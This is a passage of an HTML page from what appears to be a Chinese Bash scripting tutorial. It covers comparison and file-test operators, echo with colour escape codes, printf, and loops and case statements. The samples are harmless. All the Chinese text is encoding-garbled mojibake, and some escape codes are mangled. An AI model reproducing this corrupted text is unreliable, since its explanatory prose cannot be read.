title="å…³ç³»è¿ç®—ç¬¦"></a>å…³ç³»è¿ç®—ç¬¦</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -eq <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -ne <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ä¸ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -ge <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -le <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</span></span></code></pre></div></div><h3 id="å¸ƒå°”è¿ç®—ç¬¦"><a href="#å¸ƒå°”è¿ç®—ç¬¦" class="headerlink" title="å¸ƒå°”è¿ç®—ç¬¦"></a>å¸ƒå°”è¿ç®—ç¬¦</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">if</span> [ ! <span class="hljs-literal">false</span> ]       <span class="hljs-comment"># éè¿ç®—ï¼Œè¿”å› true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-literal">true</span> -o <span class="hljs-literal">false</span> ] <span class="hljs-comment"># æˆ–è¿ç®—ï¼Œè¿”å› true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-literal">true</span> -a <span class="hljs-literal">false</span> ] <span class="hljs-comment"># ä¸è¿ç®—ï¼Œè¿”å› false</span></span></code></pre></div></div><h3 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]]   <span class="hljs-comment"># é€»è¾‘çš„ AND, è¿”å› false</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] &amp;&amp; [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># é€»è¾‘çš„ AND, è¿”å› false</span></span><span class="line"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> || <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]]   <span class="hljs-comment"># é€»è¾‘çš„ OR, è¿”å› true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] || [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># é€»è¾‘çš„ OR, è¿”å› true</span></span></code></pre></div></div><h3 id="å­—ç¬¦ä¸²è¿ç®—ç¬¦"><a href="#å­—ç¬¦ä¸²è¿ç®—ç¬¦" class="headerlink" title="å­—ç¬¦ä¸²è¿ç®—ç¬¦"></a>å­—ç¬¦ä¸²è¿ç®—ç¬¦</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=<span class="hljs-string">&quot;abc&quot;</span></span><span class="line">b=<span class="hljs-string">&quot;efg&quot;</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> = <span class="hljs-variable">$b</span> ]   <span class="hljs-comment"># æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> ]  <span class="hljs-comment"># æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$a</span> ]     <span class="hljs-comment"># æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0ï¼Œä¸º0è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span> ]   <span class="hljs-comment"># æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0ï¼Œä¸ä¸º0è¿”å› trueã€‚</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> ]        <span class="hljs-comment"># æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºè¿”å› trueã€‚</span></span></code></pre></div></div><h3 id="æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦"><a href="#æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦" class="headerlink" title="æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦"></a>æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦</h3><p>æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦ç”¨äºæ£€æµ‹ Unix æ–‡ä»¶çš„å„ç§å±æ€§ã€‚</p><table><thead><tr><th align="center">æ“ä½œç¬¦</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">-b file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å—è®¾å¤‡æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-c file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-d file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯ç›®å½•ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-f file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯æ™®é€šæ–‡ä»¶ï¼ˆæ—¢ä¸æ˜¯ç›®å½•ï¼Œä¹Ÿä¸æ˜¯è®¾å¤‡æ–‡ä»¶ï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-g file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SGID ä½ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-k file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº†ç²˜ç€ä½(Sticky Bit)ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-p file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯æœ‰åç®¡é“ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-u file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SUID ä½ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-r file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯è¯»ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-w file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯å†™ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-x file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr><tr><td align="center">-s file</td><td align="left">æ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼ˆæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äº0ï¼‰ï¼Œä¸ä¸ºç©ºè¿”å› trueã€‚</td></tr><tr><td align="center">-e file</td><td align="left">æ£€æµ‹æ–‡ä»¶ï¼ˆåŒ…æ‹¬ç›®å½•ï¼‰æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td></tr></tbody></table><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><h3 id="å‘½ä»¤æ ¼å¼"><a href="#å‘½ä»¤æ ¼å¼" class="headerlink" title="å‘½ä»¤æ ¼å¼"></a>å‘½ä»¤æ ¼å¼</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It is a test&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> It is a <span class="hljs-built_in">test</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\&quot;It is a test\&quot;&quot;</span>      <span class="hljs-comment"># è½¬ä¹‰</span></span><span class="line">name=Chris</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$name</span> is handsome&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;OK! \n&quot;</span>             <span class="hljs-comment"># æ˜¾ç¤ºæ¢è¡Œ -e å¼€å¯è½¬ä¹‰</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It is a test&quot;</span> &gt; myfile <span class="hljs-comment"># æ˜¾ç¤ºç»“æœå®šå‘è‡³æ–‡ä»¶</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$name\&quot;&#x27;</span>               <span class="hljs-comment"># åŸæ ·è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¸è¿›è¡Œè½¬ä¹‰æˆ–å–å˜é‡ï¼ˆä½¿ç”¨å•å¼•å·ï¼‰</span></span><span class="line"><span class="hljs-built_in">echo</span> `date`                  <span class="hljs-comment"># æ˜¾ç¤ºå‘½ä»¤æ‰§è¡Œç»“æ„</span></span></code></pre></div></div><h3 id="é¢œè‰²æ˜¾ç¤º"><a href="#é¢œè‰²æ˜¾ç¤º" class="headerlink" title="é¢œè‰²æ˜¾ç¤º"></a>é¢œè‰²æ˜¾ç¤º</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-taggerscript codeBlockLines"><span class="line">echo -e &quot;<span class="hljs-symbol">\0</span>33[å­—èƒŒæ™¯é¢œè‰²ï¼›æ–‡å­—é¢œè‰²må­—ç¬¦ä¸²<span class="hljs-symbol">\0</span>33[0m&quot;</span><span class="line"></br></span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[30m é»‘è‰²å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[31m çº¢è‰²å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[32m ç»¿è‰²å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[33m é»„è‰²å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[34m è“è‰²å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[35m ç´«è‰²å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[36m å¤©è“å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[37m ç™½è‰²å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line"></br></span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[40;37m é»‘åº•ç™½å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[41;37m çº¢åº•ç™½å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[42;37m ç»¿åº•ç™½å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[43;37m é»„åº•ç™½å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[44;37m è“åº•ç™½å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[45;37m ç´«åº•ç™½å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[46;37m å¤©è“åº•ç™½å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line">echo -e â€œ<span class="hljs-symbol">\0</span>33[47;30m ç™½åº•é»‘å­— <span class="hljs-symbol">\0</span>33[0mâ€</span><span class="line"></br></span><span class="line"><span class="hljs-symbol">\3</span>3[0m å…³é—­æ‰€æœ‰å±æ€§</span><span class="line"><span class="hljs-symbol">\3</span>3[1m è®¾ç½®é«˜äº®åº¦</span><span class="line"><span class="hljs-symbol">\3</span>3[4m ä¸‹åˆ’çº¿</span><span class="line"><span class="hljs-symbol">\3</span>3[5m é—ªçƒ</span><span class="line"><span class="hljs-symbol">\3</span>3[7m åæ˜¾</span><span class="line"><span class="hljs-symbol">\3</span>3[8m æ¶ˆéš</span><span class="line"><span class="hljs-symbol">\3</span>3[30m â€” <span class="hljs-symbol">\3</span>3[37m è®¾ç½®å‰æ™¯è‰²</span><span class="line"><span class="hljs-symbol">\3</span>3[40m â€” <span class="hljs-symbol">\3</span>3[47m è®¾ç½®èƒŒæ™¯è‰²</span><span class="line"><span class="hljs-symbol">\3</span>3[nA å…‰æ ‡ä¸Šç§»nè¡Œ</span><span class="line"><span class="hljs-symbol">\3</span>3[nB å…‰æ ‡ä¸‹ç§»nè¡Œ</span><span class="line"><span class="hljs-symbol">\3</span>3[nC å…‰æ ‡å³ç§»nè¡Œ</span><span class="line"><span class="hljs-symbol">\3</span>3[nD å…‰æ ‡å·¦ç§»nè¡Œ</span><span class="line"><span class="hljs-symbol">\3</span>3[y;xHè®¾ç½®å…‰æ ‡ä½ç½®</span><span class="line"><span class="hljs-symbol">\3</span>3[2J æ¸…å±</span><span class="line"><span class="hljs-symbol">\3</span>3[K æ¸…é™¤ä»å…‰æ ‡åˆ°è¡Œå°¾çš„å†…å®¹</span><span class="line"><span class="hljs-symbol">\3</span>3[s ä¿å­˜å…‰æ ‡ä½ç½®</span><span class="line"><span class="hljs-symbol">\3</span>3[u æ¢å¤å…‰æ ‡ä½ç½®</span><span class="line"><span class="hljs-symbol">\3</span>3[?25l éšè—å…‰æ ‡</span><span class="line"><span class="hljs-symbol">\3</span>3[?25h æ˜¾ç¤ºå…‰æ ‡</span></code></pre></div></div><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4s\n&quot;</span> å§“å æ€§åˆ« ä½“é‡kg  </span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> éƒ­é– ç”· 66.1234</span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> æ¨è¿‡ ç”· 48.6543</span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> éƒ­èŠ™ å¥³ 47.9876</span></code></pre></div></div><p>ç»“æœï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" codeBlockLines"><span class="line">å§“å     æ€§åˆ«   ä½“é‡kg</span><span class="line">éƒ­é–     ç”·      66.12</span><span class="line">æ¨è¿‡     ç”·      48.65</span><span class="line">éƒ­èŠ™     å¥³      47.99</span></code></pre></div></div><blockquote><p><code>%s %c %d %f</code> éƒ½æ˜¯æ ¼å¼æ›¿ä»£ç¬¦<br><code>d</code>: Decimal åè¿›åˆ¶æ•´æ•° â€“ å¯¹åº”ä½ç½®å‚æ•°å¿…é¡»æ˜¯åè¿›åˆ¶æ•´æ•°ï¼Œå¦åˆ™æŠ¥é”™ï¼<br><code>s</code>: String å­—ç¬¦ä¸² â€“ å¯¹åº”ä½ç½®å‚æ•°å¿…é¡»æ˜¯å­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦å‹ï¼Œå¦åˆ™æŠ¥é”™ï¼<br><code>c</code>: Char å­—ç¬¦ â€“ å¯¹åº”ä½ç½®å‚æ•°å¿…é¡»æ˜¯å­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦å‹ï¼Œå¦åˆ™æŠ¥é”™ï¼<br><code>f</code>: Float æµ®ç‚¹ â€“ å¯¹åº”ä½ç½®å‚æ•°å¿…é¡»æ˜¯æ•°å­—å‹ï¼Œå¦åˆ™æŠ¥é”™ï¼<br><code>%-10s</code> æŒ‡ä¸€ä¸ªå®½åº¦ä¸º10ä¸ªå­—ç¬¦ï¼ˆ-è¡¨ç¤ºå·¦å¯¹é½ï¼Œæ²¡æœ‰åˆ™è¡¨ç¤ºå³å¯¹é½ï¼‰,ä»»ä½•å­—ç¬¦éƒ½ä¼šè¢«æ˜¾ç¤ºåœ¨10ä¸ªå­—ç¬¦å®½çš„å­—ç¬¦å†…ï¼Œå¦‚æœä¸è¶³åˆ™è‡ªåŠ¨ä»¥ç©ºæ ¼å¡«å……ï¼Œè¶…è¿‡ä¹Ÿä¼šå°†å†…å®¹å…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥ã€‚<br><code>%-4.2f</code> æŒ‡æ ¼å¼åŒ–ä¸ºå°æ•°ï¼Œå…¶ä¸­.2æŒ‡ä¿ç•™2ä½å°æ•°ã€‚</p></blockquote><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>Shellä¸­çš„ test å‘½ä»¤ç”¨äºæ£€æŸ¥æŸä¸ªæ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œå®ƒå¯ä»¥è¿›è¡Œæ•°å€¼ã€å­—ç¬¦å’Œæ–‡ä»¶ä¸‰ä¸ªæ–¹é¢çš„æµ‹è¯•ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">num1=100</span><span class="line">num2=100</span><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> $[num1] -eq $[num2]</span></code></pre></div></div><h2 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a ç­‰äº b&quot;</span></span><span class="line"><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a å¤§äº b&quot;</span></span><span class="line"><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a å°äº b&quot;</span></span><span class="line"><span class="hljs-keyword">else</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ²¡æœ‰ç¬¦åˆçš„æ¡ä»¶&quot;</span></span><span class="line"><span class="hljs-keyword">fi</span></span></code></pre></div></div><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">for</span> loop <span class="hljs-keyword">in</span> 1 2 3 4 5</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The value is: <span class="hljs-variable">$loop</span>&quot;</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">int=1</span><span class="line"><span class="hljs-keyword">while</span>(( <span class="hljs-variable">$int</span>&lt;=5 ))</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$int</span></span><span class="line">    <span class="hljs-built_in">let</span> <span class="hljs-string">&quot;int++&quot;</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;è¾“å…¥ 1 åˆ° 4 ä¹‹é—´çš„æ•°å­—:&#x27;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ä½ è¾“å…¥çš„æ•°å­—ä¸º:&#x27;</span></span><span class="line"><span class="hljs-built_in">read</span> aNum</span><span class="line"><span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">    1)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ä½ é€‰æ‹©äº† 1&#x27;</span></span><span class="line">    ;;</span><span class="line">    2)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ä½ é€‰æ‹©äº† 2&#x27;</span></span><span class="line">    ;;</span><span class="line">    3)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ä½ é€‰æ‹©äº† 3&#x27;</span></span><span class="line">    ;;</span><span class="line">    4)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ä½ é€‰æ‹©äº† 4&#x27;</span></span><span class="line">    ;;</span><span class="line">    *)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ä½ æ²¡æœ‰è¾“å…¥ 1 åˆ° 4 ä¹‹é—´çš„æ•°å­—&#x27;</span></span><span class="line">    ;;</span><span class="line"><span class="hljs-keyword">esac</span></span></code></pre></div></div><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>breakå‘½ä»¤å…è®¸è·³å‡ºæ‰€æœ‰å¾ªç¯ï¼ˆç»ˆæ­¢æ‰§è¡Œåé¢çš„æ‰€æœ‰å¾ªç¯ï¼‰ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> :</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;è¾“å…¥ 1 åˆ° 5 ä¹‹é—´çš„æ•°å­—:&quot;</span></span><span class="line">    <span class="hljs-built_in">read</span> aNum</span><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">        1|2|3|4|5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ä½ è¾“å…¥çš„æ•°å­—ä¸º <span class="hljs-variable">$aNum</span>!&quot;</span></span><span class="line">        ;;</span><span class="line">        *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ä½ è¾“å…¥çš„æ•°å­—ä¸æ˜¯ 1 åˆ° 5 ä¹‹é—´çš„! æ¸¸æˆç»“æŸ&quot;</span></span><span class="line">            <span class="hljs-built_in">break</span></span><span class="line">        ;;</span><span class="line">    <span class="hljs-keyword">esac</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><p>è·³å‡ºå½“å‰å¾ªç¯ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> :</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;è¾“å…¥ 1 åˆ° 5 ä¹‹é—´çš„æ•°å­—: &quot;</span></span><span class="line">    <span class="hljs-built_in">read</span> aNum</span><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">        1|2|3|4|5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ä½ è¾“å…¥çš„æ•°å­—ä¸º <span class="hljs-variable">$aNum</span>!&quot;</span></span><span class="line">        ;;</span><span class="line">        *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ä½ è¾“å…¥çš„æ•°å­—ä¸æ˜¯ 1 åˆ° 5 ä¹‹é—´çš„!&quot;</span></span><span class="line">            <span class="hljs-built_in">continue</span></span><span class="line">            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ¸¸æˆç»“æŸ&quot;</span></span><span class="line">        ;;</span><span class="line">    <span class="hljs-keyword">esac</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="until"><a href="#until" class="headerlink" title="until"></a>until</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"></br></span><span class="line">a=0</span><span class="line"></br></span><span class="line">until [ ! <span class="hljs-variable">$a</span> -lt 10 ]</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span></span><span class="line">   a=`expr <span class="hljs-variable">$a</span> + 1`</span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span 